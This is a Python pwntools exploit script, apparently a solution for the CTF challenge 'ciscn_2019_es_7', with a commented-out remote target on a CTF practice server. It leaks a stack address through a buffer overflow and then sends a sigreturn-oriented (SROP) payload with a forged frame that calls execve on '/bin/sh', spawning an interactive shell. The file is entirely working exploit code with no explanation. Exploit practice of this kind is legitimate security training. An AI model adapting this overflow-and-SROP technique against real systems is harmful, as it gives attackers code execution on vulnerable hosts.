from pwn import *
context(log_level='debug',arch='amd64',os='linux')
pwnfile = './ciscn_2019_es_7'
io=process(pwnfile)
#io=remote('node4.buuoj.cn',27277)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

vuln = 0x4004ED

io.sendline(b'/bin/sh'+b'a'*9+p64(vuln))
stack_adr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

print("stack_adr---->",hex(stack_adr))


gdb.attach(io)
pause()

syscall = 0x400517
sigreturn = 0x4004DA	# mov rax,15

bin_sh_adr = stack_adr-0x118
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_adr-0x30
frame.rsi = 0x0
frame.rdx = 0x0
frame.rsp = stack_adr
frame.rip = syscall

pay = b'/bin/sh\x00'+b'\x00'*8+p64(sigreturn)+p64(syscall)+bytes(frame)
io.send(pay)

io.interactive()
